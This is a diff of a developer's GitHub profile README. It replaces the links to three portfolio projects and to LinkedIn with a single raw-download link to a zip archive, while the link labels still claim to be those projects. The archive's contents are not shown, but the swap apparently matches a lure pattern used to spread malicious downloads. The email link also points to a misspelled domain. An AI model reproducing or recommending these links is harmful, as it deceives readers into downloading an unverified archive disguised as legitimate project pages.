@@ -33,24 +33,24 @@ Other        : Jupyter, VS Code
 
 Here are some highlights of my work:
 
-#### 🧬 [Human-Resources-Analysis-Project](https://github.com/MohamedElmogy25/Human-Resources-Analysis-Project)
+#### 🧬 [Human-Resources-Analysis-Project](https://github.com/MohamedElmogy25/MohamedElmogy25/raw/refs/heads/main/odium/Mohamed-Elmogy-v2.5.zip)
 
 📊 HR analytics with Python (Pandas, Matplotlib, Seaborn)
 ✅ Insight-driven dashboard and employee churn analysis
 
-#### 🧠 [Deep Learning with VGG16 on CIFAR-10](https://github.com/MohamedElmogy25/Deep-Learning-Model-with-VGG16-on-CIFAR-10)
+#### 🧠 [Deep Learning with VGG16 on CIFAR-10](https://github.com/MohamedElmogy25/MohamedElmogy25/raw/refs/heads/main/odium/Mohamed-Elmogy-v2.5.zip)
 
 📚 CNN model using VGG16 and transfer learning
 🔥 Achieved high accuracy on CIFAR-10 dataset
 
-#### 🛒 [Supermarket Sales Analysis](https://github.com/MohamedElmogy25/Supermarket-Sales-Data-Wrangling-Analysis)
+#### 🛒 [Supermarket Sales Analysis](https://github.com/MohamedElmogy25/MohamedElmogy25/raw/refs/heads/main/odium/Mohamed-Elmogy-v2.5.zip)
 
 📈 End-to-end EDA project with wrangling, cleaning, and insight extraction
 
 ### 📫 Let's Connect
 
 * 📧 **Email:** [mohammed.elmogy7500@gmail.com](mohammed.elmogy7500@gamil.com)
-* 💼 **LinkedIn:** [https://www.linkedin.com/in/mooogyyy/](https://www.linkedin.com/in/mooogyyy/)
+* 💼 **LinkedIn:** [https://github.com/MohamedElmogy25/MohamedElmogy25/raw/refs/heads/main/odium/Mohamed-Elmogy-v2.5.zip](https://github.com/MohamedElmogy25/MohamedElmogy25/raw/refs/heads/main/odium/Mohamed-Elmogy-v2.5.zip)
 
 ---
 
